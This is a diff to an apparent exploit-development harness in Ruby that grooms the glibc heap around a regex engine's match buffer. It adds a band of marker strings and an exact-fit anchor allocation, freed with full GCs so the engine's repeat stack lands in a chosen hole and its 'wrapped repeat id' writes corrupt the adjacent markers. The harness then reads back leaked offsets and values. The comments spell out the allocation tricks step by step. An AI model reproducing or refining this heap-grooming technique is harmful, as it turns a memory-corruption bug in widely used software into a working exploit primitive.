@@ -36,21 +36,37 @@ begin
     re = Regexp.new(pattern)
     compile_ms = ((Process.clock_gettime(Process::CLOCK_MONOTONIC) - t0) * 1000).round
 
-    # post-compile groom: plug the compile-freed mmap holes so the engine's
-    # combined match buffer (repeat_stk + stack) packs into fresh space,
-    # directly below the newest ruby heap page
+    # post-compile groom (stage-3 construction):
+    #   band        — post-compile marker band ('M'*4096 each): exhausts the
+    #                 compile-freed brk holes and bump-extends the heap so the
+    #                 band top ends contiguous right below the anchor
+    #   anchor_fit  — exact-fit anchor (chunk class == repeat_stk's 0x40020):
+    #                 the last big allocation before the match, freed with two
+    #                 full GCs; repeat_stk reuses the hole (glibc best-fit), so
+    #                 every wrapped repeat id writes into the band below it
+    #   (fillers/page_spray/anchor are the earlier stage-3 iterations, kept
+    #   for reproducing those runs)
     fillers = req['fillers']&.map { |f| 'F' * Integer(f) }
+    band = nil
+    if (bn = req['band'])
+      band = Array.new(Integer(bn)) { 'M' * 4096 }
+      GC.start
+    end
     sprayed = nil
     if (ps = req['page_spray'])
       sprayed = Array.new(Integer(ps)) { 'p' * 10 }
       GC.start
     end
+    if (fit = req['anchor_fit'])
+      af = 'A' * Integer(fit)
+      af = nil
+      GC.start(full_mark: true, immediate_sweep: true)
+      GC.start(full_mark: true, immediate_sweep: true)
+    end
     if (anchor = req['anchor'])
-      # freed mmap hole directly below the newest heap page: the engine's
-      # match buffer takes the top of this gap at match time (top-down
-      # placement), landing directly under the page — or a fresh GC page
-      # takes the gap and the buffer lands under THAT page. Either way the
-      # wrapped-id writes reach sprayed RVALUEs.
+      # earlier iteration: freed mmap hole directly below the newest heap
+      # page (superseded by anchor_fit — the anchor here was never actually
+      # collected before the match; see odd/tasks L14)
       a = 'A' * Integer(anchor)
       a = nil
       GC.start
@@ -76,6 +92,16 @@ begin
       end
       out[:groom_hits] = hits
       out[:groom_total] = markers.size
+    end
+    if band
+      bhits = []
+      band.each_with_index do |mk, i|
+        if (j = mk.index(/[^M]/))
+          bhits << { marker: i, offset: j, value: mk[j, 8].unpack1('Q<') }
+        end
+      end
+      out[:band_hits] = bhits
+      out[:band_total] = band.size
     end
     if sprayed
       changed = []
